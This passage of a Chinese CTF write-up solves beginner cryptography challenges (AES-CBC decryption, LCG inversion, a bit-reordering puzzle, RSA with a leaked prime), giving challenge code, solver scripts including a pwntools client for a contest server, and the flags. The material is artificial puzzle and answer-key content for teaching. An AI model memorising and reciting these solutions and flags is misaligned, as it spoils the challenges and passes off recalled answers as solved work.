iv = bytes.fromhex("536167654d61746831302e332057534c")
ciphertext = bytes.fromhex("8233e02bf1dfc9302c613736fd8a6392067ec74b6b395241786cda4412b6f857")

flag = unpad(AES.new(key, AES.MODE_CBC, iv).decrypt(ciphertext), 16).decode()
print(flag)
```

运行即可得到 flag：

```txt
flag{s@g3m@th_i5_us3fu1!}
```

### PRNG_1

```py
from Crypto.Util.number import *

flag=b'???'

a=getPrime(512)
b=getPrime(512)
n=getPrime(512)

assert len(bin(bytes_to_long(flag))[2:]) < 512
assert a < n and b < n and GCD(a, n) == 1

output=[bytes_to_long(flag)]
for i in range(5):
    output.append((a*output[-1]+b)%n)
output=output[1:]

print(f"a= {a}")
print(f"b= {b}")
print(f"n= {n}")
print(f"output= {output}")

'''
a= 11038051104293825636737927048840374948495135743638335760736456541812454600121662378092076204470379161674978025513228815908025866168932820712800494463291119
b= 7669890746838367306063750903717536289635103704268883176915983817499328681818362074906536678348292208471988261046991315172336686922433329589115523479572527
n= 13073039563554195658474100864764778501665220885172278038598817437329130269105722121849855186521998655684860370899752976230149284102665148411150394198597983
output= [8900793074909305104110408626261472876858092232592096159515121333472532663498587665921415460200787392395782892609997601479322708210482802754503678741185706, 5712803893851587208586703227979655737133620602166204726335409378093753907147459358219065404372767579458633996218272204822720290400583983784229888900299848, 5961478455432415381325949673762298930129108553751955045221772260008177818890140086961297713968043769129255420406259071456550647662869891605891788026258615, 9601854635607231070364489149740888936316562454669748338498260095110659468319706073278004444907806979731540341266366817049574624940336422976010460298558153, 7193195548766020355744607493305394353849075518067845901769284441732883246800707940547421695211725068982012930611957113063645621384275808650719159037495434]
'''
```

```py
for i in range(5):
    output.append((a*output[-1]+b)%n)
```

注意到这里是线性的伪随机数生成算法，参数已知则输入可逆：

```py
from Crypto.Util.number import long_to_bytes, inverse

a = 11038051104293825636737927048840374948495135743638335760736456541812454600121662378092076204470379161674978025513228815908025866168932820712800494463291119
b = 7669890746838367306063750903717536289635103704268883176915983817499328681818362074906536678348292208471988261046991315172336686922433329589115523479572527
n = 13073039563554195658474100864764778501665220885172278038598817437329130269105722121849855186521998655684860370899752976230149284102665148411150394198597983
output = [
    8900793074909305104110408626261472876858092232592096159515121333472532663498587665921415460200787392395782892609997601479322708210482802754503678741185706,
    5712803893851587208586703227979655737133620602166204726335409378093753907147459358219065404372767579458633996218272204822720290400583983784229888900299848,
    5961478455432415381325949673762298930129108553751955045221772260008177818890140086961297713968043769129255420406259071456550647662869891605891788026258615,
    9601854635607231070364489149740888936316562454669748338498260095110659468319706073278004444907806979731540341266366817049574624940336422976010460298558153,
    7193195548766020355744607493305394353849075518067845901769284441732883246800707940547421695211725068982012930611957113063645621384275808650719159037495434
]

m0 = (output[0] - b) * inverse(a, n) % n

print(long_to_bytes(m0))
```

```txt
flag{w3lc0me_t0_th3_world_of_r@nd0m_numb3r5!}
```

### Bitwise_shuffle

```py
from Crypto.Util.number import *
from random import *
flag = b'flag{...}'
m = bytes_to_long(flag)   
assert m.bit_length() == 279
#去看看运算顺序 , 我提醒过你了哦
def reorder_280(n: int) -> int:
    MASK = (1 << 70) - 1  
    return (MASK & ~n >> 70) << 210 | (MASK ^ n & MASK) << 70 | (MASK & n >> 210) << 140 | n >> 140 & MASK

key = getrandbits(280)
add =  ...
mask =  ... #nothing
hint = key ^ mask + add

print('add = ' , add)
print('mask = ' , mask)
print('hint = ' , hint)

c = reorder_280(key ^ m * 2)
print('c = ' , c)

'''
add =  623891754768264982074990776350111439751848797986979475190050881280504431
mask =  119168826420107867655204158289538650529930738740292127546479178481229984377
hint =  405249600549475246336440017829026242299076021264488127281336714447289062387521696099
c =  1551930951702112403311280008876925661361066974605463501990112296888076500634344458692
'''
```

由于 python 中 `+` 的优先级高于 `^`，`hint = key ^ mask + add` 相当于 `hint = key ^ (mask + add)`。

因此 key 可以被恢复。

随后进行 280 位整数分块重排，利用 key 逆向变换即可：

```py
from Crypto.Util.number import long_to_bytes

add = 623891754768264982074990776350111439751848797986979475190050881280504431
mask = 119168826420107867655204158289538650529930738740292127546479178481229984377
hint = 405249600549475246336440017829026242299076021264488127281336714447289062387521696099
c = 1551930951702112403311280008876925661361066974605463501990112296888076500634344458692

S = mask + add
key = hint ^ S
print(f"key = {key}")
print(f"key.bit_length() = {key.bit_length()}")

MASK = (1 << 70) - 1

def reorder_280_inv(out):
    # 从输出中提取四个 70 位块
    B2 = out & MASK                      # 原块2
    B0_inv = (out >> 70) & MASK          # ~原块0
    B0 = (~B0_inv) & MASK                # 原块0
    B3 = (out >> 140) & MASK             # 原块3
    B1_inv = (out >> 210) & MASK         # ~原块1
    B1 = (~B1_inv) & MASK                # 原块1
    n = (B3 << 210) | (B2 << 140) | (B1 << 70) | B0
    return n

x = reorder_280_inv(c)   # x = key ^ (m * 2)
print(f"x = {x}")
print(f"x.bit_length() = {x.bit_length()}")

m2 = x ^ key
m = m2 // 2

flag = long_to_bytes(m)
print(f"flag = {flag.decode()}")
```

```txt
key = 405249600431459772130362450985701804137946130860109529593754487489356747440849606027
key.bit_length() = 278
x = 1895235946431743322006008474654934874342284500260946408674312261369139867467967806321
x.bit_length() = 280
flag = flag{b1n@ry_15_ba51c_@nd_1mp0r7@n7}
```

### RSA_1

```py
from Crypto.Util.number import *
from secret import flag

E = 65537

FLAG1 = flag[:18]
FLAG2 = flag[18:]


def generate_prime_for_e(bits):
    while True:
        p = getPrime(bits)
        if GCD(E, p - 1) == 1:
            return p


def stage1():
    p1, q1 = generate_prime_for_e(512), generate_prime_for_e(512)

    n1 = p1 * q1
    m1 = bytes_to_long(FLAG1)
    c1 = pow(m1, E, n1)

    print(f"n1 = {n1}")
    print(f"c1 = {c1}")
    print(f"p1 = {p1}")
    print()


def stage2():
    p2, q2, r2 = (generate_prime_for_e(512) for _ in range(3))

    n2 = p2 * q2 * r2
    m2 = bytes_to_long(FLAG2)
    c2 = pow(m2, E, n2)

    print(f"n2 = {n2}")
    print(f"c2 = {c2}")
    print(f"p2 = {p2}")
    print()


print("Select stage:")
print("1. Generate Stage 1")
print("2. Generate Stage 2")
print("3. Exit")

choice = input("> ").strip()

while True:
    if choice == "3":
        print("Exiting...")
        break
    elif choice not in ["1", "2"]:
        print("Invalid choice. Please select 1, 2, or 3.")
        choice = input("> ").strip()
        continue

    if choice == "1":
        stage1()
    elif choice == "2":
        stage2()

    print("Select stage:")
    print("1. Generate Stage 1")
    print("2. Generate Stage 2")
    print("3. Exit")
    choice = input("> ").strip()
```

这是一个交互式的题目，在题目中泄露了 RSA 加密过程中重要的参数 p1 和 p2，这将导致我们可以绕过大数分解的难题而将密文解密。

```py
from pwn import remote
import re
from Crypto.Util.number import long_to_bytes, inverse

E = 65537

HOST = "110.42.112.160"
PORT = 48809

def dec_mod_p(c, p):
    d = inverse(E, p - 1)
    return pow(c % p, d, p)


def crt(remainders, moduli):
    M = 1
    for m in moduli:
        M *= m
    x = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        x = (x + r * Mi * inverse(Mi, m)) % M
    return x


io = remote(HOST, PORT)

io.recvuntil(b'> ')
io.sendline(b'1')
data1 = io.recvuntil(b'> ').decode()

n1 = int(re.search(r'n1 = (\d+)', data1).group(1))
c1 = int(re.search(r'c1 = (\d+)', data1).group(1))
p1 = int(re.search(r'p1 = (\d+)', data1).group(1))

m1 = dec_mod_p(c1, p1)
flag1 = long_to_bytes(m1)
print("FLAG1:", flag1)

rems = []
mods = []

for _ in range(2):
    io.sendline(b'2')
    data2 = io.recvuntil(b'> ').decode()

    n2 = int(re.search(r'n2 = (\d+)', data2).group(1))
    c2 = int(re.search(r'c2 = (\d+)', data2).group(1))
    p2 = int(re.search(r'p2 = (\d+)', data2).group(1))

    m_mod_p = dec_mod_p(c2, p2)
    rems.append(m_mod_p)
    mods.append(p2)

m2 = crt(rems, mods)
flag2 = long_to_bytes(m2)
print("FLAG2:", flag2)

print("FULL FLAG:", flag1 + flag2)

io.sendline(b'3')
io.close()
```

输出如下：

```bash
❯ python run.py
[+] Opening connection to 110.42.112.160 on port 48809: Done
FLAG1: b'flag{rsa_beginner_'
FLAG2: b'Ci@l1o!}'
FULL FLAG: b'flag{rsa_beginner_Ci@l1o!}'
[*] Closed connection to 110.42.112.160 port 48809
```

```txt
flag{rsa_beginner_Ci@l1o!}
```

